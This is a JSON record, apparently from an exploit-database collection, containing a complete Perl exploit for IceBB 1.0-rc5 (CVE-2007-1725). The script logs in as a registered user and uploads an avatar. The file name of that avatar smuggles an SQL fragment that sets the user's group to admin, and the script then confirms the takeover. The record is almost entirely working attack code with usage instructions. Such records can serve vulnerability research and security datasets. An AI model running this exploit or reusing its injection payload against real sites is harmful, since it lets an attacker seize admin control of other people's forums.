{
  "id": "3580",
  "title": "IceBB 1.0-rc5 - Remote Create Admin",
  "cve": "CVE-2007-1725",
  "vuln_type": "file_upload",
  "code": "#!/usr/bin/perl\r\n#  IceBB 1.0-rc5 Remote Create Admin Exploit\r\n#  1. register a user\r\n#  2. run this exploit with this usage : $perl xpl.pl [host&path] [uname] [pass]\r\n#  3. login with admin access :)\r\n# - magic_quotes_gpc = Off\r\n#\r\n#### Coded & Discovered By Hessam-x / Hessamx-at-Hessamx.net\r\n\r\nuse LWP::UserAgent;\r\nuse HTTP::Cookies;\r\n\r\n$port = \"80\";\r\n $host = $ARGV[0];\r\n $uname = $ARGV[1];\r\n $passwd = $ARGV[2];\r\n $url = \"http://\".$host;\r\n\r\n print q(\r\n ###########################################################\r\n #        IceBB 1.0-rc5 Remote Create Admin Exploit        #\r\n #                    www.Hessamx.Net                      #\r\n ################# (C)oded By Hessam-x #####################\r\n\r\n);\r\n\r\n\r\n if (@ARGV < 3) {\r\n print \" #  usage : xpl.pl [host&path] [uname] [pass]\\n\";\r\n print \" #  e.g : xpl.pl www.milw0rm.com/icebb/ str0ke 123456\\n\";\r\n exit();\r\n }\r\n\r\n   print \" [~] User/Password : $uname/$passwd \\n\";\r\n   print \" [~] Host : $host \\n\";\r\n\r\n $xpl = LWP::UserAgent->new() or die;\r\n $cookie_jar = HTTP::Cookies->new();\r\n\r\n $xpl->cookie_jar( $cookie_jar );\r\n\r\n\r\n$login = $xpl->post($url.'index.php',\r\nContent => [\r\n 'act' => 'login',\r\n'from' => 'index.php',\r\n'user' => $uname,\r\n'pass' => $passwd,\r\n'func' => 'Login',\r\n],);\r\n\r\n if($cookie_jar->as_string =~ /icebb_sessid=(.*?);/) {\r\n       $cookie = $1;\r\n   print \" [~] Logined ...\\n\";\r\n } else {\r\n print \" [-] Can not Login In $host !\\n\";\r\n exit();\r\n }\r\n\r\n $badcode = \"', user_group='1\";\r\n $avat = $xpl->post($url.'index.php',Content_Type => 'form-data',\r\n Content => [\r\n 'avtype'  => 'upload',\r\n 'act' => 'ucp',\r\n 'func' => 'avatar',\r\n 'file'   => [\r\n              undef,\r\n              'avatar.jpg'.$badcode,\r\n              Content_type => 'text/plain',\r\n              Content => 'MYAVATAR',\r\n             ],\r\n 'submit'        => 'Save',\r\n ],\r\n );\r\n $test = $xpl->get($url.'index.php');\r\nif($test->as_string =~ /Admin Control Center/) {\r\nprint \" [+] You Are admin Now ! \\n\";\r\n} else {\r\nprint \" [-] Exploit Failed ! \\n\";\r\n}\r\nprint \"\\n #################################################### \\n\";\r\n\r\n# milw0rm.com [2007-03-26]",
  "url": "https://www.exploit-db.com/exploits/3580"
}